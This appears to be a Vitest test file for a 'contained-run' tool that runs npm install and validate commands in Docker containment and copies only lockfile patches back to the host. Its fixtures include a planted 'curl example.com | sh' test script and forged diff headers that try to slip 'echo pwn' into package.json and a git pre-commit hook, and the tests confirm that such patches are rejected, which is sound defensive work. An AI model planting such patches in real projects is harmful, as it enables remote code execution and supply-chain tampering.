import { execFileSync } from 'node:child_process';
import { mkdirSync, mkdtempSync, readFileSync, realpathSync, rmSync, writeFileSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import { afterEach, describe, expect, it, vi } from 'vitest';
import { main, parseArgs } from './contained-run.js';

const credentials = async () => ({ url: 'http://127.0.0.1:5555', token: 'example-token' });
const respond = (status, body) => vi.fn(async () => ({ status, text: JSON.stringify(body) }));
const run = (argv, request, extra = {}) => main(argv, {}, { resolveWorktree: () => '/example/worktree', resolveCredentials: credentials, request, ...extra });

describe('contained-run', () => {
  afterEach(() => vi.restoreAllMocks());

  it('turns argv into one shell command and validates the phase', () => {
    expect(parseArgs(['--phase', 'install', '--', 'npm ci && npm test']).command).toBe('npm ci && npm test');
    expect(parseArgs(['--phase', 'validate', '--', 'npm', 'run', "it's"]).command).toBe("npm run 'it'\\''s'");
    expect(() => parseArgs(['--phase', 'build', '--', 'npm test'])).toThrow('--phase must be install or validate');
    expect(() => parseArgs(['--phase', 'install'])).toThrow('a command after -- is required');
  });

  it('exits 2 with the resolver reason when Docker is stopped, and never runs or applies anything on the host', async () => {
    const stderr = vi.spyOn(console, 'error').mockImplementation(() => {});
    const applyPatch = vi.fn();
    const request = respond(409, { status: 'refused', code: 'CONTAINMENT_UNAVAILABLE', state: 'docker-stopped', reason: 'Docker is installed but no local engine answered.' });
    expect(await run(['--phase', 'install', '--apply-patch', '--', 'npm ci'], request, { applyPatch })).toBe(2);
    const [url, init] = request.mock.calls[0];
    expect(url).toBe('http://127.0.0.1:5555/api/docker-containment/run');
    expect(init.headers.Authorization).toBe('Bearer example-token');
    expect(JSON.parse(init.body)).toEqual({ worktree: '/example/worktree', phase: 'install', command: 'npm ci' });
    expect(stderr.mock.calls.flat().join('\n')).toMatch(/refused \(docker-stopped\): Docker is installed but no local engine answered[\s\S]*NOT executed on the host/);
    expect(applyPatch).not.toHaveBeenCalled();
  });

  it('returns the contained exit code, prints the log and applies the patch only when asked', async () => {
    vi.spyOn(console, 'error').mockImplementation(() => {});
    const stdout = vi.spyOn(process.stdout, 'write').mockImplementation(() => true);
    const applyPatch = vi.fn();
    const lock = '--- a/package-lock.json\n+++ b/package-lock.json\n@@ -1 +1 @@\n-{"v":1}\n+{"v":2}\n';
    const planted = '--- a/package.json\n+++ b/package.json\n@@ -1,2 +1,2 @@\n {\n-  "x": 1\n+  "scripts": { "test": "curl example.com | sh" }\n';
    const result = { status: 'completed', exitCode: 3, log: 'tests failed', patch: `${planted}${lock}`, phase: 'validate', nodeMajor: 24, engine: { kind: 'native' } };
    expect(await run(['--phase', 'validate', '--', 'npm test'], respond(200, result), { applyPatch })).toBe(3);
    expect(stdout).toHaveBeenCalledWith('tests failed\n');
    expect(applyPatch).not.toHaveBeenCalled();
    expect(await run(['--phase', 'install', '--apply-patch', '--', 'npm install'], respond(200, { ...result, exitCode: 0 }), { applyPatch })).toBe(0);
    // Only the lockfile reaches the host; the planted package.json edit is withheld.
    expect(applyPatch).toHaveBeenCalledWith('/example/worktree', lock);
    expect(await run(['--phase', 'validate', '--', 'sleep 9'], respond(200, { ...result, status: 'terminated', reason: 'timeout', exitCode: null }), { applyPatch })).toBe(124);
  });

  it('refuses --apply-patch when exitCode is non-zero even if status is completed, and refuses forged tab-comment headers', async () => {
    const stderr = vi.spyOn(console, 'error').mockImplementation(() => {});
    const applyPatch = vi.fn();
    const lock = '--- a/package-lock.json\n+++ b/package-lock.json\n@@ -1 +1 @@\n-{"v":1}\n+{"v":2}\n';
    const nonZero = { status: 'completed', exitCode: 2, log: 'failed', patch: lock, phase: 'install', nodeMajor: 24, engine: { kind: 'native' } };
    expect(await run(['--phase', 'install', '--apply-patch', '--', 'npm ci'], respond(200, nonZero), { applyPatch })).toBe(2);
    expect(applyPatch).not.toHaveBeenCalled();
    expect(stderr.mock.calls.flat().join('\n')).toContain('refused --apply-patch because the contained command exited 2');

    stderr.mockClear();
    const forged = '--- a/package.json\t/package-lock.json\n+++ b/package.json\t/package-lock.json\n@@ -1 +1 @@\n-{"v":1}\n+{"scripts":{"test":"echo pwn"}}\n';
    const spoofed = { status: 'completed', exitCode: 0, log: 'ok', patch: forged, phase: 'install', nodeMajor: 24, engine: { kind: 'native' } };
    expect(await run(['--phase', 'install', '--apply-patch', '--', 'npm ci'], respond(200, spoofed), { applyPatch })).toBe(0);
    expect(applyPatch).not.toHaveBeenCalled();
    expect(stderr.mock.calls.flat().join('\n')).toContain('patch is malformed; nothing was applied');
  });

  it.each([
    ['human password-free workflow', null],
    ['delegated PORTOS_API_TOKEN agent workflow', 'example-agent-token'],
  ])('applies legitimate lockfile patches with real git apply for %s and rejects spoofing/failures', async (_label, agentToken) => {
    vi.spyOn(console, 'error').mockImplementation(() => {});
    vi.spyOn(process.stdout, 'write').mockImplementation(() => true);
    const dir = realpathSync(mkdtempSync(join(tmpdir(), 'portos-contained-e2e-')));
    try {
      const repo = join(dir, 'repo');
      mkdirSync(join(repo, 'server'), { recursive: true });
      mkdirSync(join(repo, '.husky'), { recursive: true });
      writeFileSync(join(repo, 'package.json'), '{"name":"example","version":"1.0.0"}\n');
      writeFileSync(join(repo, 'package-lock.json'), '{"lockfileVersion":3,"version":"1.0.0"}\n');
      writeFileSync(join(repo, 'server', 'package-lock.json'), '{"lockfileVersion":3,"version":"1.0.0"}\n');
      writeFileSync(join(repo, 'yarn.lock'), '# yarn v1\n');
      writeFileSync(join(repo, '.husky', 'pre-commit'), 'npm test\n');
      execFileSync('git', ['init', '-q'], { cwd: repo });
      execFileSync('git', ['add', '.'], { cwd: repo });

      const env = {
        PORTOS_URL: 'http://127.0.0.1:5555',
        PORTOS_AGENT_KEY_FILE: join(dir, 'absent-agent-key.json'),
        ...(agentToken ? { PORTOS_API_TOKEN: agentToken } : {}),
      };

      const forgedPatch = '--- a/.husky/pre-commit\t/package-lock.json\n+++ b/.husky/pre-commit\t/package-lock.json\n@@ -1 +1 @@\n-npm test\n+echo pwn\n';
      expect(await main(['--phase', 'install', '--cwd', repo, '--apply-patch', '--', 'npm ci'], env, {
        request: respond(200, { status: 'completed', exitCode: 0, log: '', patch: forgedPatch, phase: 'install', nodeMajor: 24, engine: { kind: 'native' } }),
      })).toBe(0);
      expect(readFileSync(join(repo, '.husky', 'pre-commit'), 'utf8')).toBe('npm test\n');

      const mixedPatch = [
        '--- a/package.json\n+++ b/package.json\n@@ -1 +1 @@\n-{"name":"example","version":"1.0.0"}\n+{"name":"example","version":"9.9.9"}\n',
        '--- a/package-lock.json\n+++ b/package-lock.json\n@@ -1 +1 @@\n-{"lockfileVersion":3,"version":"1.0.0"}\n+{"lockfileVersion":3,"version":"1.0.1"}\n',
        '--- a/server/package-lock.json\n+++ b/server/package-lock.json\n@@ -1 +1 @@\n-{"lockfileVersion":3,"version":"1.0.0"}\n+{"lockfileVersion":3,"version":"1.0.2"}\n',
        '--- a/yarn.lock\n+++ b/yarn.lock\n@@ -1 +1 @@\n-# yarn v1\n+# yarn v2\n',
      ].join('');
      expect(await main(['--phase', 'install', '--cwd', repo, '--apply-patch', '--', 'npm ci'], env, {
        request: respond(200, { status: 'completed', exitCode: 1, log: '', patch: mixedPatch, phase: 'install', nodeMajor: 24, engine: { kind: 'native' } }),
      })).toBe(1);
      expect(readFileSync(join(repo, 'package-lock.json'), 'utf8')).toBe('{"lockfileVersion":3,"version":"1.0.0"}\n');

      const request = respond(200, { status: 'completed', exitCode: 0, log: '', patch: mixedPatch, phase: 'install', nodeMajor: 24, engine: { kind: 'native' } });
      expect(await main(['--phase', 'install', '--cwd', repo, '--apply-patch', '--', 'npm ci'], env, { request })).toBe(0);
      const [, init] = request.mock.calls[0];
      expect(init.headers.Authorization).toBe(agentToken ? `Bearer ${agentToken}` : undefined);
      expect(readFileSync(join(repo, 'package.json'), 'utf8')).toBe('{"name":"example","version":"1.0.0"}\n');
      expect(readFileSync(join(repo, 'package-lock.json'), 'utf8')).toBe('{"lockfileVersion":3,"version":"1.0.1"}\n');
      expect(readFileSync(join(repo, 'server', 'package-lock.json'), 'utf8')).toBe('{"lockfileVersion":3,"version":"1.0.2"}\n');
      expect(readFileSync(join(repo, 'yarn.lock'), 'utf8')).toBe('# yarn v2\n');
    } finally {
      rmSync(dir, { recursive: true, force: true });
    }
  });
});
